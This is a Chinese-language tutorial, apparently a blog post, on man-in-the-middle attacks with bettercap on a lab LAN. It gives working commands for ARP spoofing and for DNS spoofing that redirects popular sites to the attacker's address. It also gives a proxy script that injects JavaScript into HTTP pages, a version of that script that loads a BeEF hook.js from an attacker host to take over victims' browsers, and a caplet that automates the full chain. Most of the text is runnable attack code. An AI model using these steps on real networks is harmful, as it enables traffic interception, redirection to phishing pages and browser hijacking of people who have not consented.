1、Bettercap

bettercap是写在围棋的强大，易于扩展和便携式框架，旨在提供安全研究人员，红teamers和反向工程师一个易于使用的，集所有功能于一身的解决方案的全部功能，他们有可能会需要用于执行侦察和攻击WiFi网络，低功耗蓝牙设备，无线HID设备和以太网

2.x是使用Go编程语言的完整实现

1.5 DNS欺骗

DNS欺骗有一个前提，就是局域网内的主机的DNS服务器是局域网的网关，才能进行欺骗。如果是公网的DNS就不行了。

DNS欺骗之前我们需要利用ARP欺骗让目标机认为网关就是我们（攻击机），所以主机就会向我们发送DNS请求，这样就可以进行DNS欺骗了


开启ARP欺骗

set arp.spoof.targets 192.168.207.136arp.spoof on

然后进行DNS欺骗

set dns.spoof.domains www.sina.comset dns.spoof.address 192.168.207.132dns.spoof on

同时可以设置多个IP地址解析

vim /root/hosts192.168.207.132 www.baidu.com192.168.207.132 www.qq.com

使用多个地址DNS解析欺骗

set dns.spoof.hosts /root/hostsdns.spoof on

1.6 JS脚本注入

通过进行ARP欺骗，我们可以拦截到流量，自然就可以对拦截到的流量进行操作，我们可以对http协议的数据包进行代理，然后向里面注入恶意脚本。

vim /root/hacker.jsfunction onResponse(req,res){    if(res.ContentType.indexOf('text/html')==0){        var body=res.ReadBody();        if(body.indexOf('</head>')!=-1){            res.Body=body.replace(                '</head>',               '<script type="text/javascript">alert("电脑已经入侵！！！！")</script></head>'            );            }        }}


1.7 开启注入方式

由于大部分网站启用https证书，测试没有效果。只有http网站测试才有效果

set arp.spoof.targets 192.168.207.136       #设置arp欺骗的目标arp.spoof on                                #开启ARP欺骗set http.proxy.script /root/hacker.js       #注入恶意脚本set https.proxy.script /root/hacker.jshttp.proxy on                               #开启HTTP代理https.proxy on

2、 结合beef注入

2.1 安装beef

apt install beef-xss

2.2 启动beef

beef-xss

Hook脚本

<script src="http://<IP>:3000/hook.js"></script>


修改配置JS脚本

vim /root/hacker.jsfunction onResponse(req,res){    if(res.ContentType.indexOf('text/html')==0){        var body=res.ReadBody();        if(body.indexOf('</head>')!=-1){            res.Body=body.replace(                '</head>',               '<script type="text/javascript" src="http://192.168.207.134:3000/hook.js"></script></head>'            );            }        }}

2.3 开启注入

set arp.spoof.targets 192.168.207.136       #设置arp欺骗的目标arp.spoof on                                #开启ARP欺骗set http.proxy.script /root/hacker.js       #注入恶意脚本set https.proxy.script /root/hacker.jshttp.proxy on                               #开启HTTP代理https.proxy on

通过在beef上查看已经有主机上线

2.4 快速启动脚本

在bettercap中，有一种文件后缀叫.cap我们启动bettercap的时候可以指定该.cap文件，就可以按照这个文件还行命令

制作脚本：

vim /root/http.capset arp.spoof.targets 192.168.207.136   arp.spoof on                          set http.proxy.script /root/hacker.js      set https.proxy.script /root/hacker.jshttp.proxy on                         https.proxy on


启动脚本：

bettercap -caplet http.cap
